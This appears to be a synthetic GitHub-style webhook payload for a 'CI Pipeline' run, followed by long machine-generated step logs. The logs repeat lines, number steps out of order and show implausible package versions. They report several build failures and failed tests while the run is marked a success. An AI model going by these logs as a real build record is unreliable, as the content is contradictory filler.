{
  "action": "completed",
  "workflow_run": {
    "id": 454,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "c74fffef7e24e71e767abd6c9a48a51ecdb02929",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-29T12:00:26.718752Z",
    "updated_at": "2025-11-29T12:02:05.127384Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_production ===\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 build completed\nCache hit for key-1605\n  PASS: test_api_health (154ms)\nCache hit for key-5088\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/service.java...\nCompiling src/utils.go...\nCompiling src/service.java...\n[12:00:26] INFO: Processing request\n  PASS: test_api_health (70ms)\nStep 4/10: Building\n  PASS: test_auth_login (355ms)\nCache hit for key-9178\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/main.py...\nCache hit for key-5132\nCache hit for key-8955\nCache hit for key-5503\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-9945\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:26] WARN: Deprecated API usage\nInstalling react@5.20.0\n[12:00:26] INFO: Processing request\n\u2717 build failed with exit code 97\nStep 3/10: Building\nStep 2/10: Building\nInstalling webpack@3.10.0\n[12:00:26] INFO: Processing request\nInstalling webpack@5.15.0\nCompiling src/service.java...\nStep 7/10: Building\n  PASS: test_auth_login (473ms)\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_api_health (123ms)\nInstalling eslint@4.12.0\nCache hit for key-5657\nStep 3/10: Building\nCompiling src/index.js...\nStep 9/10: Building\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (372ms)\nStep 3/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 build completed\nWARNING: express has known vulnerabilities\nStep 6/10: Building\n\u2713 build completed\n\u2713 build completed\nStep 1/10: Building\nCache hit for key-6288\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/index.js...\n[12:00:26] WARN: Deprecated API usage\nInstalling prettier@2.17.0\nStep 9/10: Building\n\u2713 test completed\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (249ms)\n  PASS: test_user_create (74ms)\n  PASS: test_db_connect (380ms)\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_user_create (27ms)\n[12:00:26] INFO: Processing request\n  PASS: test_user_create (378ms)\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 test completed\n  PASS: test_api_health (177ms)\n[12:00:26] INFO: Processing request\nCompiling src/app.ts...\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\nInstalling webpack@4.17.0\nInstalling lodash@4.9.0\nInstalling express@5.5.0\nStep 5/10: Building\nCache hit for key-4260\n  PASS: test_cache_hit (496ms)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (5MB)\nStep 8/10: Building\nCache hit for key-2544\nCache hit for key-8685\n\u2713 build completed\n\u2713 build completed\n\u2713 test completed\nCompiling src/index.js...\n[12:00:26] WARN: Deprecated API usage\nInstalling prettier@1.9.0\nFAILED: test_cache_hit\nCache hit for key-9368\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:26] INFO: Processing request\nInstalling prettier@5.0.0\nCompiling src/main.py...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:26] INFO: Processing request\n\u2713 test completed\n\u2713 test completed\n\u2713 test completed\n  PASS: test_db_connect (404ms)\n\u2713 lint completed\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-3324\nStep 9/10: Building\n[12:00:26] INFO: Processing request\nStep 6/10: Building\n\u2713 lint completed\n[12:00:26] INFO: Processing request\nCache hit for key-3764\nCompiling src/index.js...\nCompiling src/utils.go...\n  PASS: test_api_health (247ms)\n[12:00:26] WARN: Deprecated API usage\n  PASS: test_cache_hit (345ms)\n[12:00:26] WARN: Deprecated API usage\nInstalling axios@4.11.0\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:26] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_auth_login (277ms)\n[12:00:26] INFO: Processing request\nInstalling axios@3.9.0\n[12:00:26] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 1/10: Building\nCache hit for key-2122\nCache hit for key-3902\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\nStep 8/10: Building\nCompiling src/utils.go...\nCompiling src/app.ts...\nCompiling src/handler.rs...\nCache hit for key-6051\nInstalling axios@4.2.0\nStep 7/10: Building\nCompiling src/handler.rs...\nCache hit for key-4148\n  PASS: test_api_health (54ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:26] ERROR: Connection failed\n\u2713 test completed\nInstalling lodash@3.2.0\n  PASS: test_cache_hit (48ms)\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 test completed\n  PASS: test_auth_login (253ms)\nCache hit for key-8047\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_auth_login (207ms)\nCompiling src/app.ts...\n\u2713 test completed\nCache hit for key-9444\nInstalling jest@2.16.0\nInstalling prettier@4.9.0\n  PASS: test_cache_hit (103ms)\n\u2713 lint completed\n\u2713 lint completed\n[12:00:26] INFO: Processing request\nCache hit for key-8299\n\u2717 build failed with exit code 61\nCompiling src/service.java...\nCache hit for key-6901\nWARNING: express has known vulnerabilities\n=== Step deploy_production completed ===\n=== Step: e2e_tests ===\nStep 6/10: Building\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (46MB)\nWARNING: eslint has known vulnerabilities\nInstalling lodash@5.8.0\n\u2713 test completed\nStep 6/10: Building\n\u2713 test completed\n  PASS: test_user_create (12ms)\n  PASS: test_db_connect (403ms)\n\u2713 build completed\n\u2713 build completed\nStep 8/10: Building\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:26] INFO: Processing request\nCompiling src/index.js...\nCompiling src/utils.go...\nException: TypeError\nInstalling axios@4.11.0\nCompiling src/handler.rs...\nCache hit for key-2124\nCompiling src/main.py...\nInstalling eslint@5.13.0\n  PASS: test_cache_hit (171ms)\n[12:00:26] INFO: Processing request\nInstalling express@4.20.0\n  PASS: test_api_health (191ms)\n[12:00:26] INFO: Processing request\nStep 6/10: Building\n  PASS: test_db_connect (286ms)\nStep 10/10: Building\n  PASS: test_user_create (107ms)\nCache hit for key-2740\nInstalling jest@2.2.0\nCache hit for key-9927\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-8005\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 test completed\nCache hit for key-4945\n[12:00:26] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:26] INFO: Processing request\n\u2713 build completed\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nStep 1/10: Building\nInstalling axios@5.8.0\n  PASS: test_api_health (282ms)\nInstalling axios@2.8.0\nArtifact uploaded: build.tar.gz (2MB)\n\u2717 build failed with exit code 37\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (115ms)\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:26] INFO: Processing request\nInstalling eslint@4.4.0\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (39MB)\nInstalling axios@5.2.0\nInstalling eslint@2.10.0\n[12:00:26] ERROR: Connection failed\nCache hit for key-5303\nCompiling src/index.js...\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (98ms)\n  PASS: test_db_connect (42ms)\n\u2713 lint completed\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-1427\nInstalling prettier@3.7.0\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\n[12:00:26] WARN: Deprecated API usage\nCompiling src/index.js...\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nInstalling jest@1.13.0\nCache hit for key-3244\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCompiling src/index.js...\n[12:00:26] INFO: Processing request\nWARNING: eslint has known vulnerabilities\nCache hit for key-4299\nCache hit for key-2320\nStep 5/10: Building\n[12:00:26] WARN: Deprecated API usage\nInstalling webpack@4.15.0\nStep 8/10: Building\n  PASS: test_api_health (457ms)\n  PASS: test_api_health (147ms)\nCache hit for key-6273\nCompiling src/utils.go...\nInstalling webpack@5.20.0\nStep 3/10: Building\nInstalling jest@1.18.0\nWARNING: jest has known vulnerabilities\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 test completed\nCompiling src/service.java...\n\u2713 lint completed\nCompiling src/utils.go...\n[12:00:26] INFO: Processing request\n  PASS: test_api_health (267ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-1893\nArtifact uploaded: build.tar.gz (25MB)\nException: TypeError\nCache hit for key-3099\n\u2713 build completed\nException: TypeError\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-4452\n\u2713 build completed\n[12:00:26] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (12MB)\nStep 9/10: Building\nCompiling src/app.ts...\nWARNING: express has known vulnerabilities\nStep 9/10: Building\nCompiling src/handler.rs...\nCompiling src/utils.go...\nCache hit for key-8168\n\u2713 test completed\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:26] INFO: Processing request\n  PASS: test_user_create (22ms)\nCompiling src/handler.rs...\nStep 9/10: Building\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 9/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (39MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (24MB)\nFAILED: test_auth_login\n  PASS: test_db_connect (394ms)\n[12:00:26] INFO: Processing request\nStep 6/10: Building\n[12:00:26] INFO: Processing request\n\u2713 test completed\nCompiling src/main.py...\n\u2713 build completed\n  PASS: test_cache_hit (154ms)\n  PASS: test_user_create (56ms)\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (369ms)\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nStep 9/10: Building\nCompiling src/utils.go...\n\u2717 build failed with exit code 49\nArtifact uploaded: build.tar.gz (44MB)\nException: NullPointerException\nCache hit for key-3274\nInstalling prettier@5.18.0\nInstalling webpack@1.18.0\nCache hit for key-6146\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:26] INFO: Processing request\nCache hit for key-6301\nCompiling src/main.py...\n=== Step e2e_tests completed ===\n=== Step: setup_node ===\nInstalling jest@4.15.0\nStep 6/10: Building\nInstalling express@2.6.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_auth_login (108ms)\n\u2713 lint completed\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (262ms)\n  PASS: test_auth_login (221ms)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/handler.rs...\n[12:00:26] WARN: Deprecated API usage\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nStep 8/10: Building\n  PASS: test_user_create (292ms)\nCompiling src/service.java...\nCache hit for key-7142\nCache hit for key-6369\n[12:00:26] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/utils.go...\nCache hit for key-4879\nCache hit for key-7323\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:26] INFO: Processing request\n\u2713 lint completed\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 lint completed\nInstalling express@4.20.0\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\nCompiling src/service.java...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (13MB)\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 test completed\nWARNING: webpack has known vulnerabilities\n[12:00:26] INFO: Processing request\nInstalling webpack@3.13.0\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_user_create (485ms)\n\u2713 build completed\n\u2713 test completed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_auth_login (293ms)\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling lodash@1.12.0\n[12:00:26] INFO: Processing request\nCompiling src/app.ts...\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling prettier@4.2.0\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (16MB)\nInstalling axios@1.13.0\nCache hit for key-7760\n[12:00:26] WARN: Deprecated API usage\nInstalling lodash@5.4.0\nCache hit for key-1927\n[12:00:26] INFO: Processing request\n  PASS: test_api_health (347ms)\nCache hit for key-2911\n\u2713 build completed\nInstalling express@3.18.0\nCache hit for key-7311\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/app.ts...\nWARNING: react has known vulnerabilities\nCompiling src/utils.go...\nInstalling prettier@4.10.0\nStep 10/10: Building\nCompiling src/service.java...\n\u2713 build completed\n  PASS: test_db_connect (247ms)\nCompiling src/index.js...\nInstalling prettier@1.17.0\n[12:00:26] WARN: Deprecated API usage\nInstalling react@4.15.0\nInstalling prettier@1.18.0\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nCompiling src/utils.go...\n\u2713 lint completed\n[12:00:26] ERROR: Connection failed\nCompiling src/app.ts...\n\u2713 build completed\n[12:00:26] INFO: Processing request\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-4653\n  PASS: test_auth_login (309ms)\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:26] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:26] INFO: Processing request\nInstalling react@4.12.0\n[12:00:26] WARN: Deprecated API usage\n  PASS: test_auth_login (326ms)\nCompiling src/handler.rs...\n[12:00:26] INFO: Processing request\n  PASS: test_user_create (210ms)\n\u2713 build completed\n[12:00:26] INFO: Processing request\nStep 7/10: Building\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n  PASS: test_db_connect (24ms)\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 test completed\nException: RuntimeError\n  PASS: test_db_connect (461ms)\n\u2713 build completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (32MB)\n\u2713 test completed\nInstalling axios@5.12.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nInstalling jest@3.1.0\n[12:00:26] INFO: Processing request\n  PASS: test_api_health (373ms)\n  PASS: test_db_connect (18ms)\nArtifact uploaded: build.tar.gz (8MB)\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-4358\n\u2713 build completed\nCache hit for key-6377\nCompiling src/handler.rs...\n  PASS: test_cache_hit (474ms)\nInstalling eslint@4.14.0\nInstalling react@5.17.0\nCache hit for key-9469\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling react@5.12.0\n  PASS: test_cache_hit (421ms)\nWARNING: react has known vulnerabilities\nStep 3/10: Building\nCompiling src/handler.rs...\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:26] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-5708\n\u2713 test completed\n\u2713 test completed\n[12:00:26] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_cache_hit (37ms)\n[12:00:26] INFO: Processing request\nInstalling express@1.14.0\nInstalling lodash@3.12.0\n  PASS: test_user_create (454ms)\nCache hit for key-1915\nCompiling src/utils.go...\n[12:00:26] INFO: Processing request\n=== Step setup_node completed ===\n=== Step: type_check ===\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_api_health (145ms)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/app.ts...\nCompiling src/utils.go...\nInstalling eslint@4.17.0\nStep 4/10: Building\n  PASS: test_auth_login (134ms)\n\u2713 build completed\n[12:00:26] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 4/10: Building\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCache hit for key-1740\nCache hit for key-9993\n\u2713 build completed\nCompiling src/handler.rs...\n  PASS: test_cache_hit (282ms)\nWARNING: eslint has known vulnerabilities\n[12:00:26] INFO: Processing request\nStep 4/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 build completed\nInstalling lodash@4.16.0\n\u2713 build completed\n  PASS: test_cache_hit (261ms)\nWARNING: webpack has known vulnerabilities\nCache hit for key-6058\nInstalling webpack@3.0.0\nException: ValueError\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: test_db_connect (437ms)\n[12:00:26] INFO: Processing request\nCompiling src/handler.rs...\nCompiling src/service.java...\n  PASS: test_api_health (469ms)\nCompiling src/service.java...\n  PASS: test_api_health (321ms)\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nStep 10/10: Building\n\u2713 lint completed\n[12:00:26] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (35MB)\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_db_connect (397ms)\nException: NullPointerException\n  PASS: test_db_connect (327ms)\n  PASS: test_user_create (466ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_auth_login (74ms)\nStep 6/10: Building\nStep 8/10: Building\nInstalling axios@4.7.0\nArtifact uploaded: build.tar.gz (39MB)\nInstalling axios@1.12.0\nCache hit for key-8732\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:26] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nInstalling webpack@5.6.0\n[12:00:26] WARN: Deprecated API usage\n\u2713 build completed\nCompiling src/main.py...\nStep 7/10: Building\nInstalling express@4.5.0\n\u2713 test completed\n  PASS: test_cache_hit (15ms)\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:26] INFO: Processing request\n\u2713 lint completed\n[12:00:26] INFO: Processing request\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_api_health (257ms)\nStep 9/10: Building\nCache hit for key-5518\nStep 10/10: Building\nCompiling src/index.js...\nStep 9/10: Building\nStep 5/10: Building\n  PASS: test_db_connect (399ms)\nInstalling express@3.12.0\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 build completed\nInstalling webpack@2.0.0\nStep 5/10: Building\nInstalling express@4.20.0\nCompiling src/app.ts...\n  PASS: test_api_health (52ms)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (12MB)\nStep 6/10: Building\n\u2717 build failed with exit code 29\nArtifact uploaded: build.tar.gz (21MB)\nInstalling eslint@4.12.0\nStep 10/10: Building\n[12:00:26] INFO: Processing request\nInstalling react@1.14.0\n  PASS: test_api_health (174ms)\n  PASS: test_db_connect (233ms)\n[12:00:26] INFO: Processing request\nWARNING: react has known vulnerabilities\n[12:00:26] INFO: Processing request\nWARNING: axios has known vulnerabilities\nCompiling src/utils.go...\n\u2713 test completed\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n\u2713 test completed\nCache hit for key-4764\nCompiling src/handler.rs...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_auth_login (244ms)\n[12:00:26] INFO: Processing request\nInstalling lodash@5.6.0\n  PASS: test_auth_login (450ms)\nInstalling webpack@2.5.0\nException: NullPointerException\n  PASS: test_cache_hit (496ms)\n[12:00:26] INFO: Processing request\nStep 1/10: Building\nCache hit for key-2845\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (7MB)\nInstalling express@2.19.0\n[12:00:26] WARN: Deprecated API usage\nCache hit for key-4119\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (495ms)\n  PASS: test_user_create (299ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:26] INFO: Processing request\nInstalling axios@4.5.0\n  PASS: test_auth_login (125ms)\n  PASS: test_auth_login (435ms)\n\u2717 build failed with exit code 65\nInstalling eslint@2.11.0\nCache hit for key-1466\nInstalling react@4.16.0\nInstalling lodash@5.14.0\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 build completed\n\u2713 test completed\n  PASS: test_cache_hit (253ms)\n[12:00:26] INFO: Processing request\n  PASS: test_db_connect (84ms)\nCache hit for key-2343\nCompiling src/handler.rs...\nCompiling src/handler.rs...\n[12:00:26] INFO: Processing request\n\u2713 build completed\nCache hit for key-2003\n\u2713 test completed\nWARNING: axios has known vulnerabilities\n\u2713 test completed\n  PASS: test_api_health (411ms)\nStep 2/10: Building\nStep 4/10: Building\n\u2713 lint completed\nCache hit for key-8036\nStep 10/10: Building\n[12:00:26] INFO: Processing request\nCache hit for key-8492\n[12:00:26] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nException: TypeError\n=== Step type_check completed ===\n=== Step: build ===\nInstalling axios@1.16.0\n  PASS: test_api_health (108ms)\n  PASS: test_cache_hit (67ms)\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCompiling src/service.java...\n\u2713 test completed\nStep 3/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:26] INFO: Processing request\nInstalling express@4.3.0\nCache hit for key-5693\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:26] INFO: Processing request\nInstalling lodash@5.1.0\nInstalling eslint@2.9.0\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:26] INFO: Processing request\nWARNING: react has known vulnerabilities\n[12:00:26] INFO: Processing request\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/app.ts...\nStep 9/10: Building\nInstalling jest@5.17.0\n[12:00:26] INFO: Processing request\nStep 10/10: Building\nInstalling express@2.0.0\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_user_create (145ms)\nWARNING: eslint has known vulnerabilities\nCache hit for key-8629\nArtifact uploaded: build.tar.gz (14MB)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_auth_login (46ms)\nWARNING: webpack has known vulnerabilities\n  PASS: test_user_create (28ms)\n  PASS: test_auth_login (133ms)\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_db_connect (279ms)\nInstalling lodash@5.3.0\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCache hit for key-7278\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:26] INFO: Processing request\n  PASS: test_user_create (447ms)\nInstalling jest@1.5.0\nCompiling src/utils.go...\n\u2713 lint completed\n\u2713 test completed\nCompiling src/index.js...\nCache hit for key-1327\n  PASS: test_db_connect (485ms)\n[12:00:26] INFO: Processing request\n\u2713 build completed\n[12:00:26] INFO: Processing request\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/main.py...\nInstalling eslint@1.13.0\nCache hit for key-3360\n  PASS: test_cache_hit (403ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (11MB)\nInstalling webpack@3.20.0\nStep 7/10: Building\n[12:00:26] INFO: Processing request\nInstalling react@1.9.0\nInstalling prettier@1.10.0\nArtifact uploaded: build.tar.gz (35MB)\n\u2713 build completed\n  PASS: test_api_health (216ms)\nFAILED: test_db_connect\n\u2713 test completed\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:26] INFO: Processing request\nInstalling express@5.16.0\nInstalling express@5.9.0\nInstalling react@5.6.0\n[12:00:26] INFO: Processing request\nCompiling src/index.js...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (25MB)\nInstalling axios@2.20.0\nFAILED: test_user_create\n  PASS: test_cache_hit (210ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/app.ts...\n  PASS: test_db_connect (392ms)\n  PASS: test_user_create (129ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (28MB)\nInstalling express@5.7.0\n[12:00:26] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/utils.go...\nCache hit for key-7662\n\u2713 test completed\nCompiling src/index.js...\n[12:00:26] INFO: Processing request\nException: NullPointerException\n\u2713 build completed\n[12:00:26] INFO: Processing request\nInstalling axios@4.4.0\nInstalling jest@2.0.0\nCache hit for key-7619\nArtifact uploaded: build.tar.gz (31MB)\nException: NullPointerException\nCompiling src/service.java...\nException: ValueError\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 test completed\nStep 6/10: Building\nCache hit for key-4774\nCompiling src/main.py...\n  PASS: test_cache_hit (328ms)\nCompiling src/app.ts...\nStep 5/10: Building\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:26] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_user_create (309ms)\nInstalling lodash@4.14.0\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (11MB)\n  PASS: test_cache_hit (242ms)\nInstalling react@4.9.0\n\u2713 lint completed\n[12:00:26] INFO: Processing request\nStep 2/10: Building\nWARNING: webpack has known vulnerabilities\nCache hit for key-1108\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 build completed\nCache hit for key-2210\nInstalling prettier@4.9.0\n[12:00:26] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-8939\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:26] INFO: Processing request\nInstalling axios@5.13.0\n\u2713 build completed\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\nCache hit for key-1646\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (28MB)\nInstalling axios@3.19.0\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: test_user_create (288ms)\nCompiling src/service.java...\nCache hit for key-8320\nInstalling express@5.0.0\n[12:00:26] INFO: Processing request\nCache hit for key-6420\n  PASS: test_cache_hit (276ms)\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (36MB)\nInstalling axios@2.15.0\n[12:00:26] INFO: Processing request\nInstalling jest@5.6.0\n[12:00:26] WARN: Deprecated API usage\n\u2713 lint completed\n[12:00:26] WARN: Deprecated API usage\nCompiling src/service.java...\n=== Step build completed ===\n=== Step: setup_environment ===\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCache hit for key-3184\nCompiling src/main.py...\n  PASS: test_cache_hit (369ms)\nStep 2/10: Building\nCache hit for key-5081\n\u2713 lint completed\nCache hit for key-1266\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:26] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (30MB)\nInstalling webpack@5.5.0\nCompiling src/utils.go...\n[12:00:26] WARN: Deprecated API usage\n\u2713 build completed\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_cache_hit (410ms)\nStep 3/10: Building\n  PASS: test_db_connect (50ms)\nArtifact uploaded: build.tar.gz (32MB)\nCompiling src/index.js...\nInstalling webpack@3.19.0\n[12:00:26] INFO: Processing request\nCache hit for key-9710\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_api_health (116ms)\nArtifact uploaded: build.tar.gz (11MB)\n  PASS: test_db_connect (480ms)\n[12:00:26] INFO: Processing request\nCompiling 